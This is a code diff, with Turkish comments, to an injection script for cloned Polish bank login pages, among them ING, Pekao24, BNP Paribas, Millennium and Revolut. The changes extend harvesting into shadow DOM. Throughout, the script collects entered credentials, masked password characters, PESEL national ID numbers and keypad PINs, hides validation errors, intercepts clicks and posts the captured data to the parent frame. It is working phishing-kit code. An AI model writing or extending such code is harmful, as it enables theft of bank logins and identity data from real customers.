@@ -46,6 +46,52 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const BRAND_COLOR = ${JSON.stringify(brandColor)};
 
     // ---------------------------------------------------------------
+    // SHADOW DOM: ING'nin kaydedilmis sayfasi declarative shadow DOM
+    // kullaniyor (91 adet <template shadowrootmode>) — input ve butonlar
+    // shadow root icinde, document.querySelectorAll hicbir sey bulamaz.
+    // qsa() shadow sinirlarini asan derin sorgu; evtTarget()/evPath()
+    // shadow'dan gelen olaylarda retarget edilmis target yerine
+    // composedPath()'in gercek ilk dugumunu verir.
+    // ---------------------------------------------------------------
+    const qsa = (root, sel) => {
+      const out = [];
+      const seenEls = new Set();
+      const seenRoots = new Set();
+      const stack = [root];
+      while (stack.length) {
+        const r = stack.pop();
+        if (!r || seenRoots.has(r)) continue;
+        seenRoots.add(r);
+        try {
+          r.querySelectorAll(sel).forEach((el) => {
+            if (!seenEls.has(el)) { seenEls.add(el); out.push(el); }
+          });
+        } catch (e) {}
+        try {
+          r.querySelectorAll("*").forEach((el) => {
+            if (el.shadowRoot) stack.push(el.shadowRoot);
+          });
+        } catch (e) {}
+      }
+      return out;
+    };
+    const evPath = (e) => {
+      try {
+        const p = e.composedPath ? e.composedPath() : null;
+        if (p && p.length) return p;
+      } catch (err) {}
+      const arr = [];
+      let n = e.target;
+      let g = 0;
+      while (n && n.nodeType === 1 && g++ < 12) { arr.push(n); n = n.parentElement; }
+      return arr;
+    };
+    const evtTarget = (e) => {
+      const p = evPath(e);
+      return p.length ? p[0] : e.target;
+    };
+
+    // ---------------------------------------------------------------
     // MASKED PASSWORD BOXES (pekao24/ing/bnpparibas/alior/velobank 2.html):
     // tek-karakter password inputlari — kayitli sayfada cogusu disabled.
     // Hepsi aktif edilir, 1 karakter girilince otomatik sonrakine gecilir,
@@ -56,7 +102,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         if (!el || !el.getAttribute) return false;
         // Millennium PESEL pozisyon kutulari (Pesel-1..Pesel-11): text tipinde
         // ama tek-karakter masked davranisi ister (otomatik sonraki kutuya gec).
-        if (/^pesel-\d+$/i.test(el.getAttribute("name") || "")) return true;
+        if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) return true;
         const t = (el.getAttribute("type") || "").toLowerCase();
         if (t !== "password") return false;
         const ml = el.getAttribute("maxlength") || el.getAttribute("text-length");
@@ -66,7 +112,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const maskedBoxes = () => {
       const out = [];
       try {
-        document.querySelectorAll("input").forEach((el) => {
+        qsa(document, "input").forEach((el) => {
           if (isMaskedBox(el)) out.push(el);
         });
       } catch (e) {}
@@ -93,7 +139,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const isGarbageKey = (s) => {
       const t = normAlnum(s);
       if (t.length < 3) return true;
-      if (/^\d+$/.test(t)) return true;
+      if (/^\\d+$/.test(t)) return true;
       // "name", "id", "control123", "inginput1ab2cd" gibi anlamsiz keyler
       if (/^(name|id|input|control|el|field|key)$/.test(t)) return true;
       if (/^(control|inginput|custominput|name)[0-9a-z]{5,}$/i.test(t)) return true;
@@ -104,7 +150,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         const lb = el.getAttribute("aria-labelledby");
         if (!lb) return "";
         const parts = [];
-        lb.split(/\s+/).forEach((lid) => {
+        lb.split(/\\s+/).forEach((lid) => {
           try {
             const n = doc.getElementById(lid);
             const txt = n ? (n.textContent || "").trim() : "";
@@ -145,7 +191,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const collectFrom = (doc) => {
       const data = {};
       try {
-        doc.querySelectorAll("input, textarea, select").forEach((el) => {
+        qsa(doc, "input, textarea, select").forEach((el) => {
           const type = (el.getAttribute("type") || "text").toLowerCase();
           const name = pickKey(el, doc);
           if (!name) return;
@@ -174,7 +220,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         if (!doc || depth > 4) return;
         try {
           Object.assign(data, collectFrom(doc));
-          doc.querySelectorAll("iframe").forEach((f) => {
+          qsa(doc, "iframe").forEach((f) => {
             try { walk(f.contentDocument, depth + 1); } catch (e) {}
           });
         } catch (e) {}
@@ -185,7 +231,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       // PESEL kutulari (Pesel-N) masked DAVRANISI alir ama password'a
       // KARISMAZ — asagida ayri "pesel" alani olarak birlestirilir.
       try {
-        const boxes = maskedBoxes().filter((el) => !/^pesel-\d+$/i.test(el.getAttribute("name") || ""));
+        const boxes = maskedBoxes().filter((el) => !/^pesel-\\d+$/i.test(el.getAttribute("name") || ""));
         if (boxes.length) {
           boxes.forEach((el) => { const k = maskedKey(el); if (k && data[k] !== undefined) delete data[k]; });
           let combined = "";
@@ -197,7 +243,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       // Millennium PESEL kutulari (Pesel-10, Pesel-11 ...) -> tek "pesel" alani
       try {
         const peselParts = [];
-        document.querySelectorAll("input").forEach((el) => {
+        qsa(document, "input").forEach((el) => {
           const n = el.getAttribute("name") || "";
           if (/^pesel[-_]?/i.test(n)) {
             const v = (el.value || "").trim();
@@ -289,8 +335,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             let node = host;
             while (node && node !== document.documentElement) {
               const c = getComputedStyle(node).backgroundColor;
-              if (c && c !== "transparent" && !/^rgba?\(\s*0\s*,\s*0\s*,\s*0\s*(,\s*0\s*)?\)/.test(c)) {
-                const m = /(\d+)[,\s]+(\d+)[,\s]+(\d+)/.exec(c);
+              if (c && c !== "transparent" && !/^rgba?\\(\\s*0\\s*,\\s*0\\s*,\\s*0\\s*(,\\s*0\\s*)?\\)/.test(c)) {
+                const m = /(\\d+)[,\\s]+(\\d+)[,\\s]+(\\d+)/.exec(c);
                 if (m) darkBg = 0.2126 * +m[1] + 0.7152 * +m[2] + 0.0722 * +m[3] < 128;
                 break;
               }
@@ -344,7 +390,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         if (document.getElementById("pl-keypad-backspace")) return;
         if (!hasKeypad()) return;
         if (BANK_SLUG !== "revolut" && keypadBuffer.length === 0) return;
-        const zero = document.querySelector("button[data-value='0']");
+        const zero = qsa(document, "button[data-value='0']")[0];
         if (!zero) return;
         const cell = zero.nextElementSibling;
         const host = cell && cell.tagName === "DIV" ? cell : zero.parentElement;
@@ -452,7 +498,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           st2.textContent = bankCss;
           (root.head || root.documentElement).appendChild(st2);
         }
-        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
+        qsa(root, "button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
@@ -470,6 +516,41 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     };
 
     // ------------------------------------------------------------------
+    // SHADOW ROOT FIX: document.head'e enjekte edilen CSS shadow root
+    // icine ULASMAZ (style scoping). ING gibi shadow-DOM sayfalarda
+    // shadow-ic pointer-events/readonly kilitlerini de cozmek icin
+    // her acik shadowRoot'a kucuk fix-style enjekte edilir.
+    // ------------------------------------------------------------------
+    const fixShadowRoots = () => {
+      try {
+        const seenRoots = new Set();
+        const stack = [document];
+        while (stack.length) {
+          const r = stack.pop();
+          if (!r || seenRoots.has(r)) continue;
+          seenRoots.add(r);
+          try {
+            r.querySelectorAll("*").forEach((el) => {
+              if (el.shadowRoot) {
+                stack.push(el.shadowRoot);
+                if (!el.shadowRoot.__plStyled) {
+                  el.shadowRoot.__plStyled = true;
+                  try {
+                    const st = document.createElement("style");
+                    st.textContent =
+                      "input,textarea,select,button,a,[role=button]{pointer-events:auto!important;user-select:auto!important;-webkit-user-select:auto!important}" +
+                      "[inert]{pointer-events:auto!important}";
+                    el.shadowRoot.appendChild(st);
+                  } catch (e) {}
+                }
+              }
+            });
+          } catch (e) {}
+        }
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
     // OVERLAY KATILICI: kaydedilen sayfalarda yukleniyor splash'i,
     // cookie scrim'i, modal arkaplan gibi TAM EKRAN katmanlar JS
     // calismadigi icin kapanmiyor -> tum tiklamalari yutuyor.
@@ -480,7 +561,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         const vw = root.documentElement ? root.documentElement.clientWidth : 0;
         const vh = root.documentElement ? root.documentElement.clientHeight : 0;
         if (!vw || !vh) return;
-        root.querySelectorAll("body *").forEach((el) => {
+        qsa(root, "body *").forEach((el) => {
           try {
             if (el.__plOverlayChecked) return;
             el.__plOverlayChecked = true;
@@ -496,7 +577,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             const r = el.getBoundingClientRect();
             if (r.width < vw * 0.85 || r.height < vh * 0.85) return;
             const bg = cs.backgroundColor || "";
-            const opaque = bg && bg !== "transparent" && !/rgba?\([^)]*,\s*0(\.\d+)?\s*\)/.test(bg);
+            const opaque = bg && bg !== "transparent" && !/rgba?\\([^)]*,\\s*0(\\.\\d+)?\\s*\\)/.test(bg);
             const zi = parseInt(cs.zIndex || "0", 10) || 0;
             const txt = (el.textContent || "").trim();
             if ((opaque || zi >= 50) && txt.length < 500) {
@@ -536,13 +617,13 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     };
     const unblockInputs = (root) => {
       try {
-        root.querySelectorAll("input, textarea, select").forEach((el) => {
+        qsa(root, "input, textarea, select").forEach((el) => {
           const t = (el.getAttribute("type") || "text").toLowerCase();
           if (IGNORED.includes(t)) return;
           if (!isVisibleEl(el)) return;
           unblockAt(root, el);
         });
-        root.querySelectorAll("button, a, [role='button'], [type=submit], ing-button").forEach((el) => {
+        qsa(root, "button, a, [role='button'], [type=submit], ing-button").forEach((el) => {
           try { if (isSubmitish(el)) unblockAt(root, el); } catch (e) {}
         });
       } catch (e) {}
@@ -553,10 +634,10 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     // sayfalarda kirmizi border/uyari gorunuyor. Input'lardan invalid
     // siniflarini sil, aria-invalid=false yap, hata mesaj bloklarini gizle.
     // ------------------------------------------------------------------
-    const ERROR_TOKEN_RE = /(^|[\s_.\-])(error|errors|blad|invalid|niepoprawn|nieprawidlow|alert-danger|form-error|field-error|validation|komunikat)/i;
+    const ERROR_TOKEN_RE = /(^|[\\s_.\\-])(error|errors|blad|invalid|niepoprawn|nieprawidlow|alert-danger|form-error|field-error|validation|komunikat)/i;
     const cleanupErrorState = (root) => {
       try {
-        root.querySelectorAll("input, textarea, select").forEach((el) => {
+        qsa(root, "input, textarea, select").forEach((el) => {
           try {
             if (el.getAttribute("aria-invalid") === "true") el.setAttribute("aria-invalid", "false");
             if (el.classList) {
@@ -573,7 +654,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         // KURAL: input/button/form ICEREN wrapper ASLA gizlenmez (BNP'de
         // "ng-invalid" wrapper'i input'u de goturuyordu) — sadece hata
         // siniflari silinir. Sadece yaprak mesaj bloklari gizlenir.
-        root.querySelectorAll("[id],[class],[role='alert']").forEach((el) => {
+        qsa(root, "[id],[class],[role='alert']").forEach((el) => {
           try {
             const tag = (el.tagName || "").toLowerCase();
             if (["input", "textarea", "select", "form", "body", "html"].includes(tag)) return;
@@ -615,7 +696,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             }
             if (el.__plMasked) return;
             el.__plMasked = true;
-            if (/^pesel-\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
+            if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
             el.setAttribute("autocomplete", "off");
             el.addEventListener("input", () => {
               try {
@@ -636,7 +717,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             el.addEventListener("paste", (ev) => {
               try {
                 ev.preventDefault();
-                const txt = ((ev.clipboardData || window.clipboardData).getData("text") || "").replace(/\s/g, "");
+                const txt = ((ev.clipboardData || window.clipboardData).getData("text") || "").replace(/\\s/g, "");
                 const bx = maskedBoxes();
                 for (let j = 0; j < txt.length && i + j < bx.length; j++) {
                   bx[i + j].value = txt[j];
@@ -663,7 +744,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             if (cell.querySelector("input")) return;
             const p = cell.querySelector("p");
             const n = p ? (p.textContent || "").trim() : "";
-            if (!/^\d+$/.test(n)) return;
+            if (!/^\\d+$/.test(n)) return;
             // Gorsel bos kutunun (css-9i7jw0) uzerine absolute input koy;
             // hucreye tiklaninca da input fokusslansin.
             const host = cell.querySelector("div") || cell;
@@ -733,7 +814,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const fillableInputs = (root) => {
       const out = [];
       try {
-        root.querySelectorAll("input, textarea").forEach((el) => {
+        qsa(root, "input, textarea").forEach((el) => {
           const t = (el.getAttribute("type") || "text").toLowerCase();
           if (IGNORED.includes(t)) return;
           if (!isVisibleEl(el)) return;
@@ -783,7 +864,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         // typesiz <button>) isSubmitish ile yakalanir — hepsi gri/aktif stili alir.
         const seen = new Set();
         const btns = [];
-        root.querySelectorAll("input[type=submit], button, [type=submit], a, [role='button'], ing-button, .gigya-composite-control-submit input, .de-login-submit input").forEach((b) => {
+        qsa(root, "input[type=submit], button, [type=submit], a, [role='button'], ing-button, .gigya-composite-control-submit input, .de-login-submit input").forEach((b) => {
           try {
             if (seen.has(b)) return;
             seen.add(b);
@@ -829,6 +910,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       doc.__plCaptureInjected = true;
 
       enableControls(doc);
+      fixShadowRoots();
       fillEmptyPeselBoxes(doc);
       applyMaskedBehavior(doc);
       applyIngFix();
@@ -861,11 +943,13 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       }, true);
 
       doc.addEventListener("click", (e) => {
+        // composedPath: shadow root icinden gelen tiklamada e.target
+        // host'a retarget edilir — gercek zincir path'te durur.
+        const path = evPath(e);
+        const et = path[0] || e.target;
         try {
-          let t0 = e.target;
-          while (t0 && t0 !== doc.body) {
-            if (t0.id === "pl-keypad-continue" || t0.id === "pl-keypad-backspace") return;
-            t0 = t0.parentElement;
+          for (const t0 of path) {
+            if (t0 && (t0.id === "pl-keypad-continue" || t0.id === "pl-keypad-backspace")) return;
           }
         } catch (err) {}
 
@@ -873,37 +957,35 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         // A[href] YAKALAMA: iframe icinde dis siteye gitmeye calisan
         // linkler sandbox'ta kirilir (Alior "Cofnij" -> bos gri sayfa).
         // Geri linkleri = bir onceki adim; diger linkler = engelle.
+        // Submit gorunumlu linkler (Millennium "Zaloguj" gibi) normal
+        // submit akisina birakilir — yutulmamali.
         // --------------------------------------------------------------
         try {
-          let a = e.target;
-          let da = 0;
-          while (a && a !== doc.body && da < 4) {
-            if (a.tagName === "A" && a.getAttribute("href")) {
-              try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
-              const atxt = (
-                (a.innerText || a.textContent || "") + " " +
-                (typeof a.className === "string" ? a.className : "") + " " +
-                (a.getAttribute("ui-sref") || "") + " " + (a.id || "")
-              ).toLowerCase();
-              if (/cofnij|wstecz|powr|go[-_\s]?back|\bback\b|sign-in/.test(atxt)) {
-                try {
-                  (window.top || window.parent).postMessage(
-                    { type: "PL_BANK_SUBMIT", step: STEP, trigger: "nav-back", data: {} }, "*"
-                  );
-                } catch (err) {}
-              }
-              return;
+          let a = null;
+          for (const n of path) {
+            if (n && n.tagName === "A" && n.getAttribute && n.getAttribute("href")) { a = n; break; }
+          }
+          if (a && !isSubmitish(a)) {
+            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+            const atxt = (
+              (a.innerText || a.textContent || "") + " " +
+              (typeof a.className === "string" ? a.className : "") + " " +
+              (a.getAttribute("ui-sref") || "") + " " + (a.id || "")
+            ).toLowerCase();
+            if (/cofnij|wstecz|powr|go[-_\\s]?back|\\bback\\b|sign-in/.test(atxt)) {
+              try {
+                (window.top || window.parent).postMessage(
+                  { type: "PL_BANK_SUBMIT", step: STEP, trigger: "nav-back", data: {} }, "*"
+                );
+              } catch (err) {}
             }
-            a = a.parentElement;
-            da++;
+            return;
           }
         } catch (err) {}
 
         try {
-          let el = e.target;
-          let depth = 0;
-          while (el && el !== doc.body && depth < 5) {
-            if (el.tagName && el.tagName.toLowerCase() === "button") {
+          for (const el of path) {
+            if (el && el.nodeType === 1 && el.tagName && el.tagName.toLowerCase() === "button") {
               const dv = el.getAttribute("data-value");
               if (dv != null && /^[0-9]$/.test(dv)) {
                 if (keypadBuffer.length < PIN_MAX) keypadBuffer += dv;
@@ -916,31 +998,25 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
                 return;
               }
             }
-            el = el.parentElement;
-            depth++;
           }
         } catch (err) {}
 
         try {
-          const t = e.target;
+          const t = et;
           const ttag = (t && t.tagName || "").toLowerCase();
           if (ttag === "input" || ttag === "textarea" || ttag === "select") {
             const ttype = (t.getAttribute("type") || "").toLowerCase();
             if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
           }
         } catch (err) {}
-        let el2 = e.target;
-        let depth2 = 0;
-        while (el2 && el2 !== doc.body && depth2 < 4) {
-          if (isSubmitish(el2)) {
+        for (const el2 of path) {
+          if (el2 && el2.nodeType === 1 && isSubmitish(el2)) {
             try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
             // Form eksikse: bos alanlari kirmizi isaretle, GONDERME.
             if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return; }
             send("click:" + (el2.tagName || "").toLowerCase());
             return;
           }
-          el2 = el2.parentElement;
-          depth2++;
         }
       }, true);
 
@@ -956,7 +1032,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             return;
           }
           if (e.key !== "Enter") return;
-          const t = e.target;
+          const t = evtTarget(e);
           if (!t || !t.getAttribute) return;
           const tag = (t.tagName || "").toLowerCase();
           if (tag !== "input" && tag !== "select") return;
@@ -971,7 +1047,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const scanIframes = (doc, depth) => {
       if (!doc || depth > 4) return;
       try {
-        doc.querySelectorAll("iframe").forEach((f) => {
+        qsa(doc, "iframe").forEach((f) => {
           try {
             const d = f.contentDocument;
             if (d) { attach(d); scanIframes(d, depth + 1); }
@@ -988,12 +1064,13 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fixShadowRoots(); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
       scanIframes(document, 0);
       enableControls(document);
+      fixShadowRoots();
       fillEmptyPeselBoxes(document);
       applyMaskedBehavior(document);
       applyIngFix();
